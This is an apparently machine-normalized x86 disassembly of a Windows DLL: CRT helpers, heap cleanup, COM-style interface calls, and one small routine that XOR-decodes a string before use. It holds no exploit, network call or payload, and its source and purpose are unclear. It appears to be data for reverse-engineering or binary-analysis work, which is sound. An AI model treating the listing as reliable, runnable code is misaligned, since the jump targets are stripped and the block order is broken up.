lea edi [ ebp - 0x5c ]
call sub_10065180
mov edi esi
call sub_1005b920
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov ecx [ ebp - 0x50 ]
lea esi [ ebp - 0x9c ]
call sub_100330d0
mov edi eax
lea esi [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0xb
call sub_10009a20
lea esi [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x9
call sub_1002db00
cmp [ ebp - 0x64 ] 0x0
je r-xdata
mov ecx [ ebp - 0x50 ]
lea esi [ ebp - 0x94 ]
call sub_10068320
mov edi eax
lea esi [ ebp - 0x6c ]
mov [ ebp - 0x4 ] 0xc
call sub_10009a20
lea esi [ ebp - 0x94 ]
mov [ ebp - 0x4 ] 0x9
call sub_1002db00
cmp [ ebp - 0x6c ] 0x0
je r-xdata
mov eax [ ebp - 0x50 ]
push eax
lea esi [ ebp - 0x8c ]
call sub_1004c900
mov edi eax
lea esi [ ebp - 0x74 ]
mov [ ebp - 0x4 ] 0xd
call sub_10009a20
lea esi [ ebp - 0x8c ]
mov [ ebp - 0x4 ] 0x9
call sub_1002db00
cmp [ ebp - 0x74 ] 0x0
je r-xdata
mov esi [ HeapFree@IAT ]
mov ecx [ ebp - 0x74 ]
cmp ecx edi
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0xdf
lea edx [ ebp - 0x4c ]
push edx
lea edi [ ebx + 0x18 ]
call sub_10016630
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax 0x16
call sub_1002f620
mov ebx [ ebp - 0x78 ]
jmp r-xdata
mov edi [ ebp - 0x7c ]
lea ebx [ ebp - 0x5c ]
call sub_10065180
mov ebx [ ebp - 0x78 ]
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0xe1
jmp r-xdata
lea edi [ ebp - 0x64 ]
lea esi [ ebx + 0x28 ]
call sub_10009a20
jmp r-xdata
lea edx [ ebp - 0x40 ]
mov eax 0x4a
jmp r-xdata
lea edi [ ebp - 0x6c ]
lea esi [ ebx + 0x30 ]
call sub_10009a20
jmp r-xdata
xor edi edi
lea edi [ ebp - 0x74 ]
lea esi [ ebx + 0x38 ]
call sub_10009a20
jmp r-xdata
mov [ ebp - 0x4 ] 0x6
mov eax [ ebp - 0x60 ]
dec [ eax ]
cmp [ eax ] edi
jne r-xdata
mov ecx [ ebp - 0x6c ]
cmp ecx edi
je r-xdata
push esi
push edi
call [ GetProcessHeap@IAT ]
mov esi [ HeapFree@IAT ]
push eax
call esi
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
call sub_1002f620
mov eax [ ebp - 0x58 ]
dec [ eax ]
cmp [ eax ] edi
jne r-xdata
mov ecx [ ebp - 0x64 ]
cmp ecx edi
je r-xdata
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call esi
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov eax [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x7
mov eax [ ebp - 0x68 ]
dec [ eax ]
cmp [ eax ] edi
jne r-xdata
mov [ ebp - 0x4 ] 0x4
mov ecx [ ebp - 0x48 ]
dec [ ecx ]
jne r-xdata
mov ecx [ ebp - 0x5c ]
cmp ecx edi
je r-xdata
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call esi
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov eax [ ebp - 0x60 ]
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4c ]
cmp eax edi
je r-xdata
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call esi
mov esi ecx
call sub_100324d0
mov esi [ HeapFree@IAT ]
mov eax [ ebp - 0x58 ]
push ecx
push edi
call [ GetProcessHeap@IAT ]
push eax
call esi
call sub_10054bf0
mov ecx [ ebp - 0x4c ]
push ecx
push edi
call [ GetProcessHeap@IAT ]
push eax
call esi
mov ecx [ ebp - 0x48 ]
sub_1000b97c
push 0x4
mov eax sub_100854f2
call sub_10026266
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
call sub_10068565
mov eax esi
call sub_10008d33
retn 0x8
sub_1000b9e0
push ebp
mov ebp esp
push 0xffffffff
push sub_10086540
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
xor edi edi
push 0x10
mov [ ebp - 0x4 ] edi
call sub_1002e3ac
add esp 0x4
cmp eax edi
je r-xdata
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
mov ecx 0x1
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
mov edi eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4 ] edi
mov [ ebx ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ esi + 0x4 ]
or eax 0xffffffff
[ edx ] eax
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_1000baa0
push ebp
mov ebp esp
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
push edi
xor edi edi
mov [ ebp - 0x80 ] edi
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffac
and edx 0xff
mov [ ebp + eax * 2 - 0x2c ] dx
inc eax
cmp eax 0xd
jb r-xdata
xor eax eax
lea edx [ ebp - 0x80 ]
push edx
mov [ ebp - 0x12 ] ax
mov eax [ esi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x2c ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0x80 ]
lea edx [ ebp - 0x7c ]
mov [ ebp - 0x7c ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
test eax eax
jns r-xdata
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x40 ]
mov eax 0xf0
mov [ ebp - 0x78 ] edi
call sub_1002f620
mov eax [ ebp - 0x7c ]
mov ecx [ eax ]
lea edx [ ebp - 0x78 ]
push edx
lea edx [ ebp - 0x40 ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
mov eax [ ebp - 0x78 ]
mov edx [ esi + 0x120 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x6c ]
call eax
lea edx [ ebp - 0x10 ]
mov eax 0xf6
mov [ ebp - 0x78 ] edi
call sub_1002f620
mov eax [ ebp - 0x7c ]
mov ecx [ eax ]
lea edx [ ebp - 0x78 ]
push edx
lea edx [ ebp - 0x10 ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
mov eax [ ebp - 0x78 ]
mov edx [ esi + 0x124 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x6c ]
call eax
lea edx [ ebp - 0x74 ]
mov eax 0xc8
call sub_1002f620
jmp r-xdata
mov eax [ ebp - 0x80 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop edi
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x7c ] edi
mov eax [ ebp - 0x7c ]
cmp eax edi
je r-xdata
sub_1000bbcf
push 0x28
mov eax sub_10085438
call sub_10026266
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_10008d33
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10025720
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_10060250
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_100575c5
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_1000bc60
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x10
push edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edi ecx
sub edi eax
xor edi edi
jmp r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
jne r-xdata
push eax
push edi
mov ecx esi
call sub_1004ca30
cmp [ esi + 0x14 ] 0x10
jb r-xdata
sub eax ecx
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
add esi edi
pop edi
mov [ eax ] esi
pop esi
pop ebp
retn 0xc
mov esi [ esi ]
sub_1000bca9
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
cmp eax 0x3fffffff
jbe r-xdata
cmp esi ebx
jne r-xdata
pop edi
pop ebx
leave
retn
add eax eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
or eax 0xffffffff
jmp r-xdata
pop esi
dec [ ebp - 0x1c ]
js r-xdata
push [ ebp + 0x18 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call sub_1002e600
add esp 0x10
mov edi eax
cmp esi ebx
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_1000842a
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
inc [ ebp - 0x20 ]
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_1000842a
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
dec [ ebp - 0x1c ]
js r-xdata
mov eax edi
sub_1000bd80
push ebp
mov ebp esp
push 0xffffffff
push sub_10088d3e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x230
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx ecx
mov esi [ ebx + 0x4 ]
xor edi edi
mov [ ebp - 0x208 ] ebx
mov [ ebp - 0x228 ] eax
mov [ ebp - 0x204 ] edi
cmp esi edi
jne r-xdata
mov ecx [ ebx + 0x14 ]
mov [ ebp - 0x210 ] ecx
cmp ecx edi
jne r-xdata
lea edx [ ebp - 0x60 ]
lea eax [ edi + 0x11 ]
call sub_10069020
xor eax eax
mov [ ebp - 0x174 ] ax
mov eax edx
mov [ ebp - 0x160 ] 0x7
mov [ ebp - 0x164 ] edi
lea edx [ eax + 0x2 ]
mov eax [ eax ]
lea ecx [ eax + 0x128 ]
add eax 0x12c
mov [ ebp - 0x224 ] eax
lea edx [ ebp - 0x1c ]
mov eax 0xa7
mov [ ebp - 0x20c ] ecx
call sub_10069020
lea edx [ ebp - 0x28 ]
mov eax 0x97
call sub_10069020
lea edx [ ebp - 0xa8 ]
mov eax 0x4
call sub_10069020
lea edx [ ebp - 0x88 ]
mov eax 0x2c
call sub_10069020
lea edx [ ebp - 0x98 ]
mov eax 0x73
call sub_10069020
lea edx [ ebp - 0xbc ]
mov eax 0x3e
call sub_10069020
mov edi [ lstrcmpW@IAT ]
lea edx [ ebp - 0x1c ]
push edx
push esi
call edi
test eax eax
jne r-xdata
lea edx [ ebp - 0x64 ]
mov eax 0xda
call sub_10069020
xor eax eax
mov [ ebp - 0x174 ] ax
mov eax edx
mov [ ebp - 0x160 ] 0x7
mov [ ebp - 0x164 ] edi
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0x60 ]
push ecx
lea ecx [ ebp - 0x174 ]
call sub_10034100
lea edx [ ebp - 0x174 ]
mov ecx 0x18
mov [ ebp - 0x4 ] edi
call sub_10022b50
cmp [ ebp - 0x160 ] 0x8
jb r-xdata
lea ecx [ ebp - 0x28 ]
push ecx
push esi
call edi
test eax eax
jne r-xdata
mov eax [ ebp - 0x210 ]
dec eax
je r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0x64 ]
push ecx
lea ecx [ ebp - 0x174 ]
call sub_10034100
lea edx [ ebp - 0x174 ]
mov ecx 0x18
mov [ ebp - 0x4 ] 0x1
call sub_10022b50
cmp [ ebp - 0x160 ] 0x8
jb r-xdata
mov eax 0x1
jmp r-xdata
mov edx [ ebp - 0x174 ]
push edx
call sub_1000a86e
add esp 0x4
lea eax [ ebp - 0xa8 ]
push eax
push esi
call edi
test eax eax
jne r-xdata
lea edx [ ebp - 0x134 ]
mov eax 0xc4
call sub_10069020
push edx
lea ecx [ ebp - 0x190 ]
call sub_1004a920
mov [ ebp - 0x4 ] 0x5
lea esi [ ebp - 0x218 ]
mov ecx ebx
call sub_1005c910
mov edx [ eax ]
mov eax [ ebp - 0x224 ]
mov esi [ eax ]
mov [ ebp - 0x210 ] edx
test esi esi
je r-xdata
dec eax
je r-xdata
mov eax 0x4
jmp r-xdata
mov edx [ ebp - 0x174 ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x88 ]
push eax
push esi
call edi
test eax eax
jne r-xdata
mov eax [ ebp - 0x210 ]
sub eax 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
call sub_100702e0
xor esi esi
lea esp [ esp ]
lea esi [ ebp - 0x230 ]
mov ecx ebx
call sub_10027750
mov ebx [ eax ]
mov eax [ ebp - 0x20c ]
call sub_10027350
lea edi [ ebp - 0x230 ]
mov esi eax
call sub_1005b920
test esi esi
jne r-xdata
lea edx [ ebp - 0x134 ]
mov eax 0x137
call sub_10069020
mov eax edx
push eax
lea ecx [ ebp - 0x174 ]
call sub_1004a920
lea edx [ ebp - 0x174 ]
mov ecx 0x18
mov [ ebp - 0x4 ] 0x4
call sub_10022b50
lea ecx [ ebp - 0x174 ]
jmp r-xdata
lea ecx [ ebp - 0x98 ]
push ecx
push esi
call edi
test eax eax
je r-xdata
mov eax [ ebp - 0x210 ]
sub eax 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
mov [ ebx + 0x8 ] eax
lea edx [ ebp - 0x78 ]
mov eax 0x56
call sub_10069020
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
lea ecx [ ebp - 0x78 ]
push ecx
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea edx [ esi + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
push esi
lea ecx [ ebp - 0x78 ]
push ecx
push eax
mov [ ebx + 0xc ] eax
call sub_1007f580
mov edx [ ebp - 0x228 ]
mov edi [ edx ]
add esp 0xc
push ebx
add edi 0x138
call sub_1003f2d0
xor eax eax
push eax
call [ LocalFree@IAT ]
mov [ ebx + 0xc ] 0x0
lea edx [ ebp - 0x50 ]
mov eax 0x33
call sub_10069020
mov eax edx
push eax
lea ecx [ ebp - 0x190 ]
call sub_1004a920
lea edx [ ebp - 0x190 ]
mov ecx 0x18
mov [ ebp - 0x4 ] 0x2
call sub_10022b50
lea ecx [ ebp - 0x190 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_100702e0
mov [ ebp - 0x204 ] 0x3
jmp r-xdata
lea esi [ ebp - 0x220 ]
mov ecx ebx
call sub_1005c910
mov esi [ eax ]
lea edi [ ebp - 0x220 ]
call sub_10046710
mov eax [ ebp - 0x224 ]
push esi
call sub_10014ad0
jmp r-xdata
test esi esi
je r-xdata
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
lea edx [ ebp - 0x54 ]
mov eax 0x5
call sub_10069020
mov ecx edx
push ecx
lea ecx [ ebp - 0x1ac ]
call sub_1004a920
mov esi 0x3
lea edx [ ebp - 0x1ac ]
lea ecx [ esi + 0x15 ]
mov [ ebp - 0x4 ] esi
call sub_10022b50
lea ecx [ ebp - 0x1ac ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_100702e0
mov ebx [ ebp - 0x208 ]
mov [ ebp - 0x204 ] esi
jmp r-xdata
mov ecx [ ebp - 0x208 ]
lea esi [ ebp - 0x238 ]
call sub_10027750
mov esi [ eax ]
lea edi [ ebp - 0x238 ]
call sub_1005b920
mov eax [ ebp - 0x20c ]
push esi
call sub_10057520
mov ebx [ ebp - 0x208 ]
jmp r-xdata
lea edx [ ebp - 0xbc ]
push edx
push esi
call edi
test eax eax
je r-xdata
sub eax 0x2
jne r-xdata
lea esi [ ebp - 0x220 ]
mov ecx ebx
call sub_10027750
mov ebx [ eax ]
mov eax [ ebp - 0x20c ]
call sub_10027350
lea edi [ ebp - 0x220 ]
mov esi eax
call sub_1005b920
test esi esi
je r-xdata
lea edx [ ebp - 0x134 ]
mov eax 0x93
call sub_10069020
mov ecx edx
push ecx
lea ecx [ ebp - 0x190 ]
call sub_1004a920
mov [ ebp - 0x4 ] 0x6
jmp r-xdata
mov esi [ esi ]
jmp r-xdata
mov ecx [ ebp - 0x210 ]
mov eax [ esi ]
mov ecx [ ecx ]
mov edx [ eax ]
push ecx
push edx
call edi
test eax eax
je r-xdata
lea edx [ ebp - 0xd0 ]
mov eax 0x135
call sub_10069020
lea edx [ ebp - 0x158 ]
mov eax 0x95
call sub_10069020
push esi
lea ecx [ ebp - 0x200 ]
call sub_1004a920
push eax
lea edx [ ebp - 0xd0 ]
lea esi [ ebp - 0x1e4 ]
mov [ ebp - 0x4 ] 0x7
call sub_10040e00
add esp 0x4
push eax
lea edx [ ebp - 0x158 ]
lea esi [ ebp - 0x1c8 ]
mov [ ebp - 0x4 ] 0x8
call sub_100519f0
add esp 0x4
mov edx eax
mov ecx 0x18
mov [ ebp - 0x4 ] 0x9
call sub_10022b50
mov ecx esi
call sub_100702e0
lea ecx [ ebp - 0x1e4 ]
call sub_100702e0
lea ecx [ ebp - 0x200 ]
mov [ ebp - 0x204 ] 0x2
lea esi [ ebp - 0x220 ]
mov ecx ebx
call sub_10027750
mov ebx [ eax ]
mov eax [ ebp - 0x20c ]
call sub_10027350
lea edi [ ebp - 0x220 ]
mov esi eax
call sub_1005b920
test esi esi
je r-xdata
mov ebx [ ebp - 0x208 ]
mov [ ebp - 0x204 ] 0x4
jmp r-xdata
mov ecx [ ebp - 0x208 ]
lea esi [ ebp - 0x218 ]
call sub_10027750
mov esi [ eax ]
lea edi [ ebp - 0x218 ]
call sub_1005b920
mov edx [ ebp - 0x20c ]
push esi
push edx
call sub_10005290
mov ebx [ ebp - 0x208 ]
jmp r-xdata
lea edx [ ebp - 0x190 ]
mov ecx 0x18
call sub_10022b50
lea ecx [ ebp - 0x190 ]
jmp r-xdata
lea edi [ ebp - 0x218 ]
call sub_10046710
test esi esi
jne r-xdata
mov ecx [ ebp - 0x208 ]
lea esi [ ebp - 0x218 ]
call sub_10027750
mov esi [ eax ]
lea edi [ ebp - 0x218 ]
call sub_1005b920
mov eax [ ebp - 0x20c ]
mov ecx esi
call sub_10060e40
mov ebx [ ebp - 0x208 ]
jmp r-xdata
sub_1000c429
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_1004b450
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_100579de
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
push esi
call sub_1001b2d2
pop ecx
xor esi esi
push 0x0
push esi
call sub_10034468
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_1000c4b2
push 0x10
push r--data
call sub_1007fad0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_1003a6bb
and [ eax ] 0x0
call sub_1005b670
mov [ eax ] 0x9
call sub_1003a6bb
and [ eax ] 0x0
call sub_1005b670
mov [ eax ] 0x9
call sub_1004b131
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_1007fb15
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_1005fd8b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1005b670
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_100431a2
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000c56e
mov eax [ ebp - 0x1c ]
sub_1000c580
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_1000c927
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
not esi
lea ecx [ ebp - 0x4 ]
and esi edi
call sub_10003c9c
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
cmp eax 0xffffffff
jae r-xdata
dec eax
mov [ edi + 0x4 ] eax
sub_1000c5c0
push esi
mov esi eax
mov edx [ esi ]
mov eax [ esi + 0x4 ]
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
push r--data
call sub_10030594
pop esi
retn
push edi
mov edx ecx
shr edx 0x1
mov edi 0x3fffffff
sub edi edx
cmp edi ecx
pop edi
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
push ecx
call sub_10044070
mov ecx eax
cmp ecx eax
jae r-xdata
sub_1000c610
push ebp
mov ebp esp
sub esp 0x8
push ebx
push edi
mov ebx 0xfffffffc
lea ecx [ ecx ]
mov edi [ esi + 0x18 ]
cmp edi [ esi + 0x1c ]
je r-xdata
lea ebx [ ebx ]
mov ecx [ esi + 0x1c ]
mov eax [ esi + 0x18 ]
cmp eax ecx
je r-xdata
mov edx [ edi + 0x1c ]
push edx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
add edi 0x24
cmp edi [ esi + 0x1c ]
jne r-xdata
mov ecx [ edi ]
test ecx ecx
je r-xdata
cmp eax 0x6
je r-xdata
cmp [ esi + 0x14 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
push edx
push ecx
call sub_10067720
mov ebx [ esi + 0x1c ]
add esp 0x8
mov [ ebp - 0x4 ] eax
mov edi eax
cmp eax ebx
je r-xdata
mov ecx [ esi + 0x8 ]
lea eax [ edi + 0x4 ]
sub ecx eax
sar ecx 0x2
add ecx ecx
add ecx ecx
push ecx
push eax
push edi
call sub_1007ec40
add esp 0xc
add [ esi + 0x8 ] ebx
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx + 0xc ]
push 0x1
call eax
add edi 0x4
cmp edi ecx
jne r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x14 ]
mov edi [ eax ]
mov ebx [ eax + 0x4 ]
test edi edi
je r-xdata
mov [ esi + 0x1c ] eax
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov edi [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
cmp edi ecx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x48 ]
cmp eax 0x4
je r-xdata
mov edx [ esi + 0x14 ]
push edx
call [ LocalFree@IAT ]
mov [ esi + 0x14 ] ebx
test ebx ebx
jne r-xdata
push edi
call sub_100492c0
push edi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] cx
add edi 0x24
cmp edi ebx
jne r-xdata
mov eax [ edi ]
push eax
call sub_1000a86e
mov eax [ ebp - 0x4 ]
add esp 0x4
sub_1000c735
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push 0x90
xor ebx ebx
push ebx
push edi
call sub_1007f8f0
mov esi [ ebp + 0xc ]
mov al [ esi ]
add esp 0xc
test al al
jne r-xdata
cmp al 0x2e
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
push esi
mov [ ebp + 0xc ] ebx
call sub_1007f530
cmp eax ebx
jmp r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] bl
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
pop ecx
pop ecx
jne r-xdata
push 0xf
push eax
lea eax [ edi + 0x80 ]
push 0x10
push eax
call sub_10049cc0
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebp + 0xc ] 0x0
lea edi [ eax + esi ]
mov bl [ edi ]
jne r-xdata
or eax 0xffffffff
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ edi + 0x8f ] bl
jmp r-xdata
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp bl 0x2e
je r-xdata
cmp eax 0x10
jae r-xdata
cmp bl 0x5f
je r-xdata
push eax
push esi
push 0x40
push [ ebp + 0x8 ]
jmp r-xdata
test bl bl
je r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x40
add eax 0x40
jmp r-xdata
call sub_10049cc0
add esp 0x10
test eax eax
jne r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x10
sub eax 0xffffff80
cmp bl 0x2c
jne r-xdata
push eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
cmp bl 0x2c
je r-xdata
call sub_1005aa2b
test bl bl
je r-xdata
inc [ ebp + 0xc ]
lea esi [ edi + 0x1 ]
push r--data
push esi
call sub_1007f530
test eax eax
sub_1000c860
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_1003ab70
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_1000c882
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ ebx ]
mov esi ebx
jmp r-xdata
lea edi [ ebp + 0x8 ]
push eax
call sub_10002c6e
pop ecx
test eax eax
jne r-xdata
inc esi
movzx eax [ esi ]
mov al [ esi ]
cmp al 0x2d
je r-xdata
mov [ ebp + 0xf ] al
inc esi
cmp al 0x2b
je r-xdata
mov esi 0x7fffffff
cmp ebx [ edi ]
jne r-xdata
mov [ edi ] ebx
mov [ ebp + 0xf ] 0x2b
jmp r-xdata
cmp [ ebp + 0xf ] 0x2b
jne r-xdata
test eax eax
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
push esi
call sub_10046885
add esp 0x10
cmp esi [ edi ]
jne r-xdata
cmp [ ebp + 0xf ] 0x2d
jne r-xdata
cmp eax esi
ja r-xdata
call sub_1005b670
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp eax 0x80000000
jbe r-xdata
xor eax eax
